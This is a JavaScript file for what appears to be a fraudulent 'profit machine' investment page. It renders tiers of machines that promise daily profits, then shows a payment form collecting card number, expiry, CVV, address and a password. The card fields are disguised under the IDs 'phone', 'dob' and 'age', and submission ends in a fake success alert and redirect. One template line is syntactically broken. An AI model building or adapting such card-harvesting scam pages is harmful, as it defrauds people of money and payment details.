    // Render Machines
    function loadMachines(category) {
      const container = document.getElementById(${category}-section);
      machines[category].forEach(machine => {
        const machineElement = document.createElement("div");
        machineElement.classList.add("machine", category);
        machineElement.innerHTML = `
          <h3>${machine.name}</h3>
          <img src="${machine.img}" alt="${machine.name}" style="width: 100%; border-radius: 8px; margin: 10px 0;">
          <p>${machine.desc}</p>
          <p>Price: $${machine.price}</p>
          <p>Profit: $${machine.profit}/day</p>
          <button onclick="buyMachine('${category}', '${machine.name}', '${machine.img}', ${machine.price})">Buy</button>
        `;
        container.appendChild(machineElement);
      });
    }

    // Load all categories
    ["vip", "premium", "standard"].forEach(loadMachines);

    // Buy Machine (hides machine section and shows payment page)
    function buyMachine(category, name, img, price) {
      selectedMachine = { category, name, img, price };
      document.querySelector(".machine-section").style.display = "none";
      document.getElementById("payment-page").style.display = "block";
      document.getElementById("selected-machine").innerHTML = `
        <h3>Buying: ${name}</h3>
        <img src="${img}" alt="${name}" style="width: 100%; border-radius: 8px; margin: 10px 0;">
        <p>Price: $${price}</p>
      `;
    }

    // Payment Form Validation and Submission
    function handleSignup(event) {
      event.preventDefault();

      const form = document.getElementById("SignupForm");
      const cardType = document.getElementById("name_selection").value;
      const cardNumber = document.getElementById("phone").value;
      const expiryDate = document.getElementById("dob").value;
      const cvv = document.getElementById("age").value;
      const address1 = document.getElementById("address-1").value;
      const country = document.getElementById("country").value;
      const city = document.getElementById("city").value;
      const password = document.getElementById("password").value;
      // Optional fields: address-2 and postalcode (no validation required)

      if (!cardType || !cardNumber || !expiryDate || !cvv || !address1 || !country || !city || !password) {
        alert("Please fill in all required fields.");
        return;
      }

      form.submit();
    }

    // Formatting for card number: insert a space every 4 digits
    document.getElementById("phone").addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "").replace(/(.{4})/g, "$1 ").trim();
      e.target.value = value.substring(0, 19);
    });

    // Formatting for expiry date: MM/YY format
    document.getElementById("dob").addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "");
      if (value.length > 4) value = value.substring(0, 4);
      if (value.length >= 2) value = value.substring(0, 2) + "/" + value.substring(2);
      e.target.value = value;
    });

    // CVV formatting: only digits and maximum 3 characters
    document.getElementById("age").addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "").trim();
      e.target.value = value.substring(0, 3);
    });

    // Postal code formatting: only digits and maximum 5 characters
    document.getElementById("postalcode").addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "").trim();
      e.target.value = value.substring(0, 5);
    });

    // Toggle password visibility
    function togglePasswordVisibility() {
      const passwordInput = document.getElementById("password");
      const toggleIcon = document.getElementById("password-toggle-icon");

      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        toggleIcon.classList.remove("fa-eye-slash");
        toggleIcon.classList.add("fa-eye");
      } else {
        passwordInput.type = "password";
        toggleIcon.classList.remove("fa-eye");
        toggleIcon.classList.add("fa-eye-slash");
      }
    }

    // Generate random security letters for display
    function generateRandomLetters(length) {
      const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
      let result = "";
      for (let i = 0; i < length; i++) {
        result += letters.charAt(Math.floor(Math.random() * letters.length));
      }
      return result;
    }

    const randomLetters = generateRandomLetters(5);
    document.getElementById("random-letters").innerText = randomLetters;

    document.getElementById("SignupForm").addEventListener("submit", function (e) {
    e.preventDefault();

    // Hide form and show spinner
    document.getElementById("SignupForm").style.display = "none";
    document.getElementById("loading-spinner").style.display = "block";

    // Simulate loading for 3 seconds
    setTimeout(() => {
      // Show success message
      alert("Signup successful! Redirecting to homepage...");
      
      // Redirect to homepage
      window.location.href = "/";
    }, 3000);
  });
  
  function showMyMachines() {
  document.querySelector('.machine-section').style.display = 'none';
  document.getElementById('payment-page').style.display = 'none';
  document.getElementById('my-machines').style.display = 'block';
}



function showMyWithdraw() {
  document.querySelector('.machine-section').style.display = 'none';
  document.getElementById('payment-page').style.display = 'none';
  document.getElementById('withdraw').style.display = 'block';
}
// Home function to return to main page
function showHome() {
  document.getElementById('my-machines').style.display = 'none';
  document.getElementById('withdraw').style.display = 'none';
  document.getElementById('payment-page').style.display = 'none';
  document.querySelector('.machine-section').style.display = 'block';
}


